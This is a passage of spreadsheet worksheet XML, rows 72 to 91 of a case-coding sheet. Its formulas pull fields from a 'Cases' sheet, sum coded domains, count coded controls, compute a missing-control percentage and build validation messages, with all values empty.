      <c r="AK72" s="13">
        <f>IF(AI72="","",COUNTIF(N72:AG72,1))</f>
        <v/>
      </c>
      <c r="AL72" s="13">
        <f>IF(OR(AJ72="",AJ72=0),"",ROUND(100*(AJ72-AK72)/AJ72,1))</f>
        <v/>
      </c>
      <c r="AM72" s="11">
        <f>IF(AI72="","",IF(AI72=0,"No domain coded 1; ","")&amp;IF(M72="","Primary domain missing; ",IF(IFERROR(INDEX(E72:L72,1,M72),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N72:AG72)&lt;&gt;AJ72,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH72="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN72" s="13">
        <f>IF(AND(AI72&lt;&gt;"",AM72=""),1,0)</f>
        <v/>
      </c>
      <c r="AO72" s="14" t="n"/>
    </row>
    <row r="73">
      <c r="A73" s="11">
        <f>Cases!A73</f>
        <v/>
      </c>
      <c r="B73" s="11">
        <f>Cases!B73</f>
        <v/>
      </c>
      <c r="C73" s="11">
        <f>Cases!C73</f>
        <v/>
      </c>
      <c r="D73" s="11">
        <f>IF(Cases!F73="",LEFT(Cases!G73,120),Cases!F73)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E73:L73)=0,"",SUM(E73:L73))</f>
        <v/>
      </c>
      <c r="AJ73" s="13">
        <f>IF(AI73="","",N(E73)*3+N(F73)*2+N(G73)*2+N(H73)*2+N(I73)*2+N(J73)*3+N(K73)*3+N(L73)*3)</f>
        <v/>
      </c>
      <c r="AK73" s="13">
        <f>IF(AI73="","",COUNTIF(N73:AG73,1))</f>
        <v/>
      </c>
      <c r="AL73" s="13">
        <f>IF(OR(AJ73="",AJ73=0),"",ROUND(100*(AJ73-AK73)/AJ73,1))</f>
        <v/>
      </c>
      <c r="AM73" s="11">
        <f>IF(AI73="","",IF(AI73=0,"No domain coded 1; ","")&amp;IF(M73="","Primary domain missing; ",IF(IFERROR(INDEX(E73:L73,1,M73),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N73:AG73)&lt;&gt;AJ73,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH73="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN73" s="13">
        <f>IF(AND(AI73&lt;&gt;"",AM73=""),1,0)</f>
        <v/>
      </c>
      <c r="AO73" s="14" t="n"/>
    </row>
    <row r="74">
      <c r="A74" s="11">
        <f>Cases!A74</f>
        <v/>
      </c>
      <c r="B74" s="11">
        <f>Cases!B74</f>
        <v/>
      </c>
      <c r="C74" s="11">
        <f>Cases!C74</f>
        <v/>
      </c>
      <c r="D74" s="11">
        <f>IF(Cases!F74="",LEFT(Cases!G74,120),Cases!F74)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E74:L74)=0,"",SUM(E74:L74))</f>
        <v/>
      </c>
      <c r="AJ74" s="13">
        <f>IF(AI74="","",N(E74)*3+N(F74)*2+N(G74)*2+N(H74)*2+N(I74)*2+N(J74)*3+N(K74)*3+N(L74)*3)</f>
        <v/>
      </c>
      <c r="AK74" s="13">
        <f>IF(AI74="","",COUNTIF(N74:AG74,1))</f>
        <v/>
      </c>
      <c r="AL74" s="13">
        <f>IF(OR(AJ74="",AJ74=0),"",ROUND(100*(AJ74-AK74)/AJ74,1))</f>
        <v/>
      </c>
      <c r="AM74" s="11">
        <f>IF(AI74="","",IF(AI74=0,"No domain coded 1; ","")&amp;IF(M74="","Primary domain missing; ",IF(IFERROR(INDEX(E74:L74,1,M74),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N74:AG74)&lt;&gt;AJ74,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH74="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN74" s="13">
        <f>IF(AND(AI74&lt;&gt;"",AM74=""),1,0)</f>
        <v/>
      </c>
      <c r="AO74" s="14" t="n"/>
    </row>
    <row r="75">
      <c r="A75" s="11">
        <f>Cases!A75</f>
        <v/>
      </c>
      <c r="B75" s="11">
        <f>Cases!B75</f>
        <v/>
      </c>
      <c r="C75" s="11">
        <f>Cases!C75</f>
        <v/>
      </c>
      <c r="D75" s="11">
        <f>IF(Cases!F75="",LEFT(Cases!G75,120),Cases!F75)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E75:L75)=0,"",SUM(E75:L75))</f>
        <v/>
      </c>
      <c r="AJ75" s="13">
        <f>IF(AI75="","",N(E75)*3+N(F75)*2+N(G75)*2+N(H75)*2+N(I75)*2+N(J75)*3+N(K75)*3+N(L75)*3)</f>
        <v/>
      </c>
      <c r="AK75" s="13">
        <f>IF(AI75="","",COUNTIF(N75:AG75,1))</f>
        <v/>
      </c>
      <c r="AL75" s="13">
        <f>IF(OR(AJ75="",AJ75=0),"",ROUND(100*(AJ75-AK75)/AJ75,1))</f>
        <v/>
      </c>
      <c r="AM75" s="11">
        <f>IF(AI75="","",IF(AI75=0,"No domain coded 1; ","")&amp;IF(M75="","Primary domain missing; ",IF(IFERROR(INDEX(E75:L75,1,M75),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N75:AG75)&lt;&gt;AJ75,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH75="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN75" s="13">
        <f>IF(AND(AI75&lt;&gt;"",AM75=""),1,0)</f>
        <v/>
      </c>
      <c r="AO75" s="14" t="n"/>
    </row>
    <row r="76">
      <c r="A76" s="11">
        <f>Cases!A76</f>
        <v/>
      </c>
      <c r="B76" s="11">
        <f>Cases!B76</f>
        <v/>
      </c>
      <c r="C76" s="11">
        <f>Cases!C76</f>
        <v/>
      </c>
      <c r="D76" s="11">
        <f>IF(Cases!F76="",LEFT(Cases!G76,120),Cases!F76)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E76:L76)=0,"",SUM(E76:L76))</f>
        <v/>
      </c>
      <c r="AJ76" s="13">
        <f>IF(AI76="","",N(E76)*3+N(F76)*2+N(G76)*2+N(H76)*2+N(I76)*2+N(J76)*3+N(K76)*3+N(L76)*3)</f>
        <v/>
      </c>
      <c r="AK76" s="13">
        <f>IF(AI76="","",COUNTIF(N76:AG76,1))</f>
        <v/>
      </c>
      <c r="AL76" s="13">
        <f>IF(OR(AJ76="",AJ76=0),"",ROUND(100*(AJ76-AK76)/AJ76,1))</f>
        <v/>
      </c>
      <c r="AM76" s="11">
        <f>IF(AI76="","",IF(AI76=0,"No domain coded 1; ","")&amp;IF(M76="","Primary domain missing; ",IF(IFERROR(INDEX(E76:L76,1,M76),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N76:AG76)&lt;&gt;AJ76,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH76="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN76" s="13">
        <f>IF(AND(AI76&lt;&gt;"",AM76=""),1,0)</f>
        <v/>
      </c>
      <c r="AO76" s="14" t="n"/>
    </row>
    <row r="77">
      <c r="A77" s="11">
        <f>Cases!A77</f>
        <v/>
      </c>
      <c r="B77" s="11">
        <f>Cases!B77</f>
        <v/>
      </c>
      <c r="C77" s="11">
        <f>Cases!C77</f>
        <v/>
      </c>
      <c r="D77" s="11">
        <f>IF(Cases!F77="",LEFT(Cases!G77,120),Cases!F77)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E77:L77)=0,"",SUM(E77:L77))</f>
        <v/>
      </c>
      <c r="AJ77" s="13">
        <f>IF(AI77="","",N(E77)*3+N(F77)*2+N(G77)*2+N(H77)*2+N(I77)*2+N(J77)*3+N(K77)*3+N(L77)*3)</f>
        <v/>
      </c>
      <c r="AK77" s="13">
        <f>IF(AI77="","",COUNTIF(N77:AG77,1))</f>
        <v/>
      </c>
      <c r="AL77" s="13">
        <f>IF(OR(AJ77="",AJ77=0),"",ROUND(100*(AJ77-AK77)/AJ77,1))</f>
        <v/>
      </c>
      <c r="AM77" s="11">
        <f>IF(AI77="","",IF(AI77=0,"No domain coded 1; ","")&amp;IF(M77="","Primary domain missing; ",IF(IFERROR(INDEX(E77:L77,1,M77),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N77:AG77)&lt;&gt;AJ77,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH77="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN77" s="13">
        <f>IF(AND(AI77&lt;&gt;"",AM77=""),1,0)</f>
        <v/>
      </c>
      <c r="AO77" s="14" t="n"/>
    </row>
    <row r="78">
      <c r="A78" s="11">
        <f>Cases!A78</f>
        <v/>
      </c>
      <c r="B78" s="11">
        <f>Cases!B78</f>
        <v/>
      </c>
      <c r="C78" s="11">
        <f>Cases!C78</f>
        <v/>
      </c>
      <c r="D78" s="11">
        <f>IF(Cases!F78="",LEFT(Cases!G78,120),Cases!F78)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI78" s="13">
        <f>IF(COUNT(E78:L78)=0,"",SUM(E78:L78))</f>
        <v/>
      </c>
      <c r="AJ78" s="13">
        <f>IF(AI78="","",N(E78)*3+N(F78)*2+N(G78)*2+N(H78)*2+N(I78)*2+N(J78)*3+N(K78)*3+N(L78)*3)</f>
        <v/>
      </c>
      <c r="AK78" s="13">
        <f>IF(AI78="","",COUNTIF(N78:AG78,1))</f>
        <v/>
      </c>
      <c r="AL78" s="13">
        <f>IF(OR(AJ78="",AJ78=0),"",ROUND(100*(AJ78-AK78)/AJ78,1))</f>
        <v/>
      </c>
      <c r="AM78" s="11">
        <f>IF(AI78="","",IF(AI78=0,"No domain coded 1; ","")&amp;IF(M78="","Primary domain missing; ",IF(IFERROR(INDEX(E78:L78,1,M78),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N78:AG78)&lt;&gt;AJ78,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH78="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN78" s="13">
        <f>IF(AND(AI78&lt;&gt;"",AM78=""),1,0)</f>
        <v/>
      </c>
      <c r="AO78" s="14" t="n"/>
    </row>
    <row r="79">
      <c r="A79" s="11">
        <f>Cases!A79</f>
        <v/>
      </c>
      <c r="B79" s="11">
        <f>Cases!B79</f>
        <v/>
      </c>
      <c r="C79" s="11">
        <f>Cases!C79</f>
        <v/>
      </c>
      <c r="D79" s="11">
        <f>IF(Cases!F79="",LEFT(Cases!G79,120),Cases!F79)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E79:L79)=0,"",SUM(E79:L79))</f>
        <v/>
      </c>
      <c r="AJ79" s="13">
        <f>IF(AI79="","",N(E79)*3+N(F79)*2+N(G79)*2+N(H79)*2+N(I79)*2+N(J79)*3+N(K79)*3+N(L79)*3)</f>
        <v/>
      </c>
      <c r="AK79" s="13">
        <f>IF(AI79="","",COUNTIF(N79:AG79,1))</f>
        <v/>
      </c>
      <c r="AL79" s="13">
        <f>IF(OR(AJ79="",AJ79=0),"",ROUND(100*(AJ79-AK79)/AJ79,1))</f>
        <v/>
      </c>
      <c r="AM79" s="11">
        <f>IF(AI79="","",IF(AI79=0,"No domain coded 1; ","")&amp;IF(M79="","Primary domain missing; ",IF(IFERROR(INDEX(E79:L79,1,M79),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N79:AG79)&lt;&gt;AJ79,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH79="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN79" s="13">
        <f>IF(AND(AI79&lt;&gt;"",AM79=""),1,0)</f>
        <v/>
      </c>
      <c r="AO79" s="14" t="n"/>
    </row>
    <row r="80">
      <c r="A80" s="11">
        <f>Cases!A80</f>
        <v/>
      </c>
      <c r="B80" s="11">
        <f>Cases!B80</f>
        <v/>
      </c>
      <c r="C80" s="11">
        <f>Cases!C80</f>
        <v/>
      </c>
      <c r="D80" s="11">
        <f>IF(Cases!F80="",LEFT(Cases!G80,120),Cases!F80)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E80:L80)=0,"",SUM(E80:L80))</f>
        <v/>
      </c>
      <c r="AJ80" s="13">
        <f>IF(AI80="","",N(E80)*3+N(F80)*2+N(G80)*2+N(H80)*2+N(I80)*2+N(J80)*3+N(K80)*3+N(L80)*3)</f>
        <v/>
      </c>
      <c r="AK80" s="13">
        <f>IF(AI80="","",COUNTIF(N80:AG80,1))</f>
        <v/>
      </c>
      <c r="AL80" s="13">
        <f>IF(OR(AJ80="",AJ80=0),"",ROUND(100*(AJ80-AK80)/AJ80,1))</f>
        <v/>
      </c>
      <c r="AM80" s="11">
        <f>IF(AI80="","",IF(AI80=0,"No domain coded 1; ","")&amp;IF(M80="","Primary domain missing; ",IF(IFERROR(INDEX(E80:L80,1,M80),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N80:AG80)&lt;&gt;AJ80,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH80="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN80" s="13">
        <f>IF(AND(AI80&lt;&gt;"",AM80=""),1,0)</f>
        <v/>
      </c>
      <c r="AO80" s="14" t="n"/>
    </row>
    <row r="81">
      <c r="A81" s="11">
        <f>Cases!A81</f>
        <v/>
      </c>
      <c r="B81" s="11">
        <f>Cases!B81</f>
        <v/>
      </c>
      <c r="C81" s="11">
        <f>Cases!C81</f>
        <v/>
      </c>
      <c r="D81" s="11">
        <f>IF(Cases!F81="",LEFT(Cases!G81,120),Cases!F81)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E81:L81)=0,"",SUM(E81:L81))</f>
        <v/>
      </c>
      <c r="AJ81" s="13">
        <f>IF(AI81="","",N(E81)*3+N(F81)*2+N(G81)*2+N(H81)*2+N(I81)*2+N(J81)*3+N(K81)*3+N(L81)*3)</f>
        <v/>
      </c>
      <c r="AK81" s="13">
        <f>IF(AI81="","",COUNTIF(N81:AG81,1))</f>
        <v/>
      </c>
      <c r="AL81" s="13">
        <f>IF(OR(AJ81="",AJ81=0),"",ROUND(100*(AJ81-AK81)/AJ81,1))</f>
        <v/>
      </c>
      <c r="AM81" s="11">
        <f>IF(AI81="","",IF(AI81=0,"No domain coded 1; ","")&amp;IF(M81="","Primary domain missing; ",IF(IFERROR(INDEX(E81:L81,1,M81),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N81:AG81)&lt;&gt;AJ81,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH81="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN81" s="13">
        <f>IF(AND(AI81&lt;&gt;"",AM81=""),1,0)</f>
        <v/>
      </c>
      <c r="AO81" s="14" t="n"/>
    </row>
    <row r="82">
      <c r="A82" s="11">
        <f>Cases!A82</f>
        <v/>
      </c>
      <c r="B82" s="11">
        <f>Cases!B82</f>
        <v/>
      </c>
      <c r="C82" s="11">
        <f>Cases!C82</f>
        <v/>
      </c>
      <c r="D82" s="11">
        <f>IF(Cases!F82="",LEFT(Cases!G82,120),Cases!F82)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E82:L82)=0,"",SUM(E82:L82))</f>
        <v/>
      </c>
      <c r="AJ82" s="13">
        <f>IF(AI82="","",N(E82)*3+N(F82)*2+N(G82)*2+N(H82)*2+N(I82)*2+N(J82)*3+N(K82)*3+N(L82)*3)</f>
        <v/>
      </c>
      <c r="AK82" s="13">
        <f>IF(AI82="","",COUNTIF(N82:AG82,1))</f>
        <v/>
      </c>
      <c r="AL82" s="13">
        <f>IF(OR(AJ82="",AJ82=0),"",ROUND(100*(AJ82-AK82)/AJ82,1))</f>
        <v/>
      </c>
      <c r="AM82" s="11">
        <f>IF(AI82="","",IF(AI82=0,"No domain coded 1; ","")&amp;IF(M82="","Primary domain missing; ",IF(IFERROR(INDEX(E82:L82,1,M82),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N82:AG82)&lt;&gt;AJ82,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH82="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN82" s="13">
        <f>IF(AND(AI82&lt;&gt;"",AM82=""),1,0)</f>
        <v/>
      </c>
      <c r="AO82" s="14" t="n"/>
    </row>
    <row r="83">
      <c r="A83" s="11">
        <f>Cases!A83</f>
        <v/>
      </c>
      <c r="B83" s="11">
        <f>Cases!B83</f>
        <v/>
      </c>
      <c r="C83" s="11">
        <f>Cases!C83</f>
        <v/>
      </c>
      <c r="D83" s="11">
        <f>IF(Cases!F83="",LEFT(Cases!G83,120),Cases!F83)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E83:L83)=0,"",SUM(E83:L83))</f>
        <v/>
      </c>
      <c r="AJ83" s="13">
        <f>IF(AI83="","",N(E83)*3+N(F83)*2+N(G83)*2+N(H83)*2+N(I83)*2+N(J83)*3+N(K83)*3+N(L83)*3)</f>
        <v/>
      </c>
      <c r="AK83" s="13">
        <f>IF(AI83="","",COUNTIF(N83:AG83,1))</f>
        <v/>
      </c>
      <c r="AL83" s="13">
        <f>IF(OR(AJ83="",AJ83=0),"",ROUND(100*(AJ83-AK83)/AJ83,1))</f>
        <v/>
      </c>
      <c r="AM83" s="11">
        <f>IF(AI83="","",IF(AI83=0,"No domain coded 1; ","")&amp;IF(M83="","Primary domain missing; ",IF(IFERROR(INDEX(E83:L83,1,M83),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N83:AG83)&lt;&gt;AJ83,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH83="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN83" s="13">
        <f>IF(AND(AI83&lt;&gt;"",AM83=""),1,0)</f>
        <v/>
      </c>
      <c r="AO83" s="14" t="n"/>
    </row>
    <row r="84">
      <c r="A84" s="11">
        <f>Cases!A84</f>
        <v/>
      </c>
      <c r="B84" s="11">
        <f>Cases!B84</f>
        <v/>
      </c>
      <c r="C84" s="11">
        <f>Cases!C84</f>
        <v/>
      </c>
      <c r="D84" s="11">
        <f>IF(Cases!F84="",LEFT(Cases!G84,120),Cases!F84)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E84:L84)=0,"",SUM(E84:L84))</f>
        <v/>
      </c>
      <c r="AJ84" s="13">
        <f>IF(AI84="","",N(E84)*3+N(F84)*2+N(G84)*2+N(H84)*2+N(I84)*2+N(J84)*3+N(K84)*3+N(L84)*3)</f>
        <v/>
      </c>
      <c r="AK84" s="13">
        <f>IF(AI84="","",COUNTIF(N84:AG84,1))</f>
        <v/>
      </c>
      <c r="AL84" s="13">
        <f>IF(OR(AJ84="",AJ84=0),"",ROUND(100*(AJ84-AK84)/AJ84,1))</f>
        <v/>
      </c>
      <c r="AM84" s="11">
        <f>IF(AI84="","",IF(AI84=0,"No domain coded 1; ","")&amp;IF(M84="","Primary domain missing; ",IF(IFERROR(INDEX(E84:L84,1,M84),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N84:AG84)&lt;&gt;AJ84,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH84="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN84" s="13">
        <f>IF(AND(AI84&lt;&gt;"",AM84=""),1,0)</f>
        <v/>
      </c>
      <c r="AO84" s="14" t="n"/>
    </row>
    <row r="85">
      <c r="A85" s="11">
        <f>Cases!A85</f>
        <v/>
      </c>
      <c r="B85" s="11">
        <f>Cases!B85</f>
        <v/>
      </c>
      <c r="C85" s="11">
        <f>Cases!C85</f>
        <v/>
      </c>
      <c r="D85" s="11">
        <f>IF(Cases!F85="",LEFT(Cases!G85,120),Cases!F85)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E85:L85)=0,"",SUM(E85:L85))</f>
        <v/>
      </c>
      <c r="AJ85" s="13">
        <f>IF(AI85="","",N(E85)*3+N(F85)*2+N(G85)*2+N(H85)*2+N(I85)*2+N(J85)*3+N(K85)*3+N(L85)*3)</f>
        <v/>
      </c>
      <c r="AK85" s="13">
        <f>IF(AI85="","",COUNTIF(N85:AG85,1))</f>
        <v/>
      </c>
      <c r="AL85" s="13">
        <f>IF(OR(AJ85="",AJ85=0),"",ROUND(100*(AJ85-AK85)/AJ85,1))</f>
        <v/>
      </c>
      <c r="AM85" s="11">
        <f>IF(AI85="","",IF(AI85=0,"No domain coded 1; ","")&amp;IF(M85="","Primary domain missing; ",IF(IFERROR(INDEX(E85:L85,1,M85),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N85:AG85)&lt;&gt;AJ85,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH85="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN85" s="13">
        <f>IF(AND(AI85&lt;&gt;"",AM85=""),1,0)</f>
        <v/>
      </c>
      <c r="AO85" s="14" t="n"/>
    </row>
    <row r="86">
      <c r="A86" s="11">
        <f>Cases!A86</f>
        <v/>
      </c>
      <c r="B86" s="11">
        <f>Cases!B86</f>
        <v/>
      </c>
      <c r="C86" s="11">
        <f>Cases!C86</f>
        <v/>
      </c>
      <c r="D86" s="11">
        <f>IF(Cases!F86="",LEFT(Cases!G86,120),Cases!F86)</f>
        <v/>
      </c>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c r="AH86" s="12" t="n"/>
      <c r="AI86" s="13">
        <f>IF(COUNT(E86:L86)=0,"",SUM(E86:L86))</f>
        <v/>
      </c>
      <c r="AJ86" s="13">
        <f>IF(AI86="","",N(E86)*3+N(F86)*2+N(G86)*2+N(H86)*2+N(I86)*2+N(J86)*3+N(K86)*3+N(L86)*3)</f>
        <v/>
      </c>
      <c r="AK86" s="13">
        <f>IF(AI86="","",COUNTIF(N86:AG86,1))</f>
        <v/>
      </c>
      <c r="AL86" s="13">
        <f>IF(OR(AJ86="",AJ86=0),"",ROUND(100*(AJ86-AK86)/AJ86,1))</f>
        <v/>
      </c>
      <c r="AM86" s="11">
        <f>IF(AI86="","",IF(AI86=0,"No domain coded 1; ","")&amp;IF(M86="","Primary domain missing; ",IF(IFERROR(INDEX(E86:L86,1,M86),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N86:AG86)&lt;&gt;AJ86,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH86="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN86" s="13">
        <f>IF(AND(AI86&lt;&gt;"",AM86=""),1,0)</f>
        <v/>
      </c>
      <c r="AO86" s="14" t="n"/>
    </row>
    <row r="87">
      <c r="A87" s="11">
        <f>Cases!A87</f>
        <v/>
      </c>
      <c r="B87" s="11">
        <f>Cases!B87</f>
        <v/>
      </c>
      <c r="C87" s="11">
        <f>Cases!C87</f>
        <v/>
      </c>
      <c r="D87" s="11">
        <f>IF(Cases!F87="",LEFT(Cases!G87,120),Cases!F87)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E87:L87)=0,"",SUM(E87:L87))</f>
        <v/>
      </c>
      <c r="AJ87" s="13">
        <f>IF(AI87="","",N(E87)*3+N(F87)*2+N(G87)*2+N(H87)*2+N(I87)*2+N(J87)*3+N(K87)*3+N(L87)*3)</f>
        <v/>
      </c>
      <c r="AK87" s="13">
        <f>IF(AI87="","",COUNTIF(N87:AG87,1))</f>
        <v/>
      </c>
      <c r="AL87" s="13">
        <f>IF(OR(AJ87="",AJ87=0),"",ROUND(100*(AJ87-AK87)/AJ87,1))</f>
        <v/>
      </c>
      <c r="AM87" s="11">
        <f>IF(AI87="","",IF(AI87=0,"No domain coded 1; ","")&amp;IF(M87="","Primary domain missing; ",IF(IFERROR(INDEX(E87:L87,1,M87),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N87:AG87)&lt;&gt;AJ87,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH87="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN87" s="13">
        <f>IF(AND(AI87&lt;&gt;"",AM87=""),1,0)</f>
        <v/>
      </c>
      <c r="AO87" s="14" t="n"/>
    </row>
    <row r="88">
      <c r="A88" s="11">
        <f>Cases!A88</f>
        <v/>
      </c>
      <c r="B88" s="11">
        <f>Cases!B88</f>
        <v/>
      </c>
      <c r="C88" s="11">
        <f>Cases!C88</f>
        <v/>
      </c>
      <c r="D88" s="11">
        <f>IF(Cases!F88="",LEFT(Cases!G88,120),Cases!F88)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E88:L88)=0,"",SUM(E88:L88))</f>
        <v/>
      </c>
      <c r="AJ88" s="13">
        <f>IF(AI88="","",N(E88)*3+N(F88)*2+N(G88)*2+N(H88)*2+N(I88)*2+N(J88)*3+N(K88)*3+N(L88)*3)</f>
        <v/>
      </c>
      <c r="AK88" s="13">
        <f>IF(AI88="","",COUNTIF(N88:AG88,1))</f>
        <v/>
      </c>
      <c r="AL88" s="13">
        <f>IF(OR(AJ88="",AJ88=0),"",ROUND(100*(AJ88-AK88)/AJ88,1))</f>
        <v/>
      </c>
      <c r="AM88" s="11">
        <f>IF(AI88="","",IF(AI88=0,"No domain coded 1; ","")&amp;IF(M88="","Primary domain missing; ",IF(IFERROR(INDEX(E88:L88,1,M88),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N88:AG88)&lt;&gt;AJ88,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH88="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN88" s="13">
        <f>IF(AND(AI88&lt;&gt;"",AM88=""),1,0)</f>
        <v/>
      </c>
      <c r="AO88" s="14" t="n"/>
    </row>
    <row r="89">
      <c r="A89" s="11">
        <f>Cases!A89</f>
        <v/>
      </c>
      <c r="B89" s="11">
        <f>Cases!B89</f>
        <v/>
      </c>
      <c r="C89" s="11">
        <f>Cases!C89</f>
        <v/>
      </c>
      <c r="D89" s="11">
        <f>IF(Cases!F89="",LEFT(Cases!G89,120),Cases!F89)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E89:L89)=0,"",SUM(E89:L89))</f>
        <v/>
      </c>
      <c r="AJ89" s="13">
        <f>IF(AI89="","",N(E89)*3+N(F89)*2+N(G89)*2+N(H89)*2+N(I89)*2+N(J89)*3+N(K89)*3+N(L89)*3)</f>
        <v/>
      </c>
      <c r="AK89" s="13">
        <f>IF(AI89="","",COUNTIF(N89:AG89,1))</f>
        <v/>
      </c>
      <c r="AL89" s="13">
        <f>IF(OR(AJ89="",AJ89=0),"",ROUND(100*(AJ89-AK89)/AJ89,1))</f>
        <v/>
      </c>
      <c r="AM89" s="11">
        <f>IF(AI89="","",IF(AI89=0,"No domain coded 1; ","")&amp;IF(M89="","Primary domain missing; ",IF(IFERROR(INDEX(E89:L89,1,M89),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N89:AG89)&lt;&gt;AJ89,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH89="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN89" s="13">
        <f>IF(AND(AI89&lt;&gt;"",AM89=""),1,0)</f>
        <v/>
      </c>
      <c r="AO89" s="14" t="n"/>
    </row>
    <row r="90">
      <c r="A90" s="11">
        <f>Cases!A90</f>
        <v/>
      </c>
      <c r="B90" s="11">
        <f>Cases!B90</f>
        <v/>
      </c>
      <c r="C90" s="11">
        <f>Cases!C90</f>
        <v/>
      </c>
      <c r="D90" s="11">
        <f>IF(Cases!F90="",LEFT(Cases!G90,120),Cases!F90)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E90:L90)=0,"",SUM(E90:L90))</f>
        <v/>
      </c>
      <c r="AJ90" s="13">
        <f>IF(AI90="","",N(E90)*3+N(F90)*2+N(G90)*2+N(H90)*2+N(I90)*2+N(J90)*3+N(K90)*3+N(L90)*3)</f>
        <v/>
      </c>
      <c r="AK90" s="13">
        <f>IF(AI90="","",COUNTIF(N90:AG90,1))</f>
        <v/>
      </c>
      <c r="AL90" s="13">
        <f>IF(OR(AJ90="",AJ90=0),"",ROUND(100*(AJ90-AK90)/AJ90,1))</f>
        <v/>
      </c>
      <c r="AM90" s="11">
        <f>IF(AI90="","",IF(AI90=0,"No domain coded 1; ","")&amp;IF(M90="","Primary domain missing; ",IF(IFERROR(INDEX(E90:L90,1,M90),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N90:AG90)&lt;&gt;AJ90,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH90="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN90" s="13">
        <f>IF(AND(AI90&lt;&gt;"",AM90=""),1,0)</f>
        <v/>
      </c>
      <c r="AO90" s="14" t="n"/>
    </row>
    <row r="91">
      <c r="A91" s="11">
        <f>Cases!A91</f>
        <v/>
      </c>
      <c r="B91" s="11">
        <f>Cases!B91</f>
        <v/>
      </c>
      <c r="C91" s="11">
        <f>Cases!C91</f>
        <v/>
      </c>
      <c r="D91" s="11">
        <f>IF(Cases!F91="",LEFT(Cases!G91,120),Cases!F91)</f>
        <v/>
      </c>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3">
